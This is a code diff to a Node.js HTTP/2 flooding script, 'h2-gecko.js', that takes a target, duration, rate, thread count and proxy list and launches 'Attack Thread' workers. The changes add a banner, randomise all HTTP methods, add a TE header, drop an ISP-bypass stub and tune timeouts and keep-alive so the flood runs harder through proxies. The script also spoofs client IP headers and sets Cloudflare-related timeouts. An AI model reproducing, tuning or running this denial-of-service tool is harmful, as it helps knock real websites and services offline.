@@ -16,6 +16,11 @@
  });
 
  if (process.argv.length < 7){
+ console.log(`
+░█▀▀▀█ ─█▀▀█ ▀█▀ ▀▀█▀▀ ─█▀▀█ ░█▀▄▀█ ─█▀▀█ 
+─▀▀▀▄▄ ░█▄▄█ ░█─ ─░█── ░█▄▄█ ░█░█░█ ░█▄▄█ 
+░█▄▄▄█ ░█─░█ ▄█▄ ─░█── ░█─░█ ░█──░█ ░█─░█
+`);
  console.log(`node h2-gecko.js [TARGET] [TIME] [RATE] [THREAD] [PROXY]`); process.exit();}
  const headers = {};
   function readLines(filePath) {
@@ -104,8 +109,13 @@
 
 if (cluster.isMaster){
   console.clear();
-
-    for (let i = 1; i <= process.argv[5]; i++){
+  console.log(`
+░█▀▀▀█ ─█▀▀█ ▀█▀ ▀▀█▀▀ ─█▀▀█ ░█▀▄▀█ ─█▀▀█ 
+─▀▀▀▄▄ ░█▄▄█ ░█─ ─░█── ░█▄▄█ ░█░█░█ ░█▄▄█ 
+░█▄▄▄█ ░█─░█ ▄█▄ ─░█── ░█─░█ ░█──░█ ░█─░█
+`);
+  
+  for (let i = 1; i <= process.argv[5]; i++){
     cluster.fork();
     console.log(`[\x1b[35mINFO\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
   }
@@ -159,6 +169,7 @@ const cplist = [
 ];
 
 const hihi = [ "require-corp", "unsafe-none", ];
+
 const sigalgs = [
  'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
  'ecdsa_brainpoolP256r1tls13_sha256',
@@ -336,7 +347,7 @@ controle_header = [
 ]
 
 const Methods = [
-   "GET"
+   "GET", "HEAD", "POST", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"
 ];
 const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];
 
@@ -3042,6 +3053,7 @@ headers["sec-ch-ua-mobile"] = randomHeaders['sec-ch-ua-mobile'];
 headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
 headers["vary"] = randomHeaders['vary'];
 headers["x-requested-with"] = "XMLHttpRequest";
+headers["TE"] = trailers;
 headers["set-cookie"] = randomHeaders['set-cookie'];
 headers["Server"] = randomHeaders['Server'];
 headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
@@ -3060,19 +3072,6 @@ headers["Client-IP"] = fakeIP;
 headers["Real-IP"] = fakeIP;
 headers["Referer"] = randomReferer;
 
-// Logika bypass permintaan semua ISP
-const bypassISP = (target) => {
-    const isp = target.isp; // Ambil ISP dari target
-    if (isp) {
-        // Lakukan tindakan bypass
-        headers["X-Bypass-ISP"] = "true"; // Contoh header untuk bypass
-        headers["X-ISP-Name"] = isp; // Menyimpan nama ISP dalam header
-    }
-};
-
-// Panggil fungsi bypass dengan target yang ada
-bypassISP(parsedTarget);
-
  
  function runFlooder() {
      const proxyAddr = randomElement(proxies);
@@ -3086,7 +3085,7 @@ bypassISP(parsedTarget);
          host: parsedProxy[0],
          port: ~~parsedProxy[1],
          address: parsedTarget.host + ":443",
-         timeout: 2500
+         timeout: 25
      };
 
     setTimeout(function(){
@@ -3101,17 +3100,17 @@ bypassISP(parsedTarget);
      Socker.HTTP(proxyOptions, (connection, error) => {
          if (error) return
  
-         connection.setKeepAlive(true, 20000);
+         connection.setKeepAlive(true, 900000);
 
          const tlsOptions = {
             ALPNProtocols: ['h2'],
             challengesToSolve: Infinity,
             resolveWithFullResponse: true,
             followAllRedirects: true,
-            maxRedirects: 50,
-            clientTimeout: 20000,
+            maxRedirects: 10,
+            clientTimeout: 5000,
             clientlareMaxTimeout: 10000,
-            cloudflareTimeout: 20000,
+            cloudflareTimeout: 5000,
             cloudflareMaxTimeout: 30000,
             ciphers: tls.getCiphers().join(":") + cipper,
             secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
@@ -3127,7 +3126,7 @@ bypassISP(parsedTarget);
             port: 443,
             uri: parsedTarget.host,
             servername: parsedTarget.host,
-            sessionTimeout: 20000,
+            sessionTimeout: 5000,
         };
 
          const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
@@ -3170,7 +3169,7 @@ bypassISP(parsedTarget);
     
                     request.end();
                 }
-            }, 500); 
+            }, 1000); 
          });
  
          client.on("close", () => {
@@ -3186,3 +3185,6 @@ bypassISP(parsedTarget);
          });
      });
  }
+
+
+
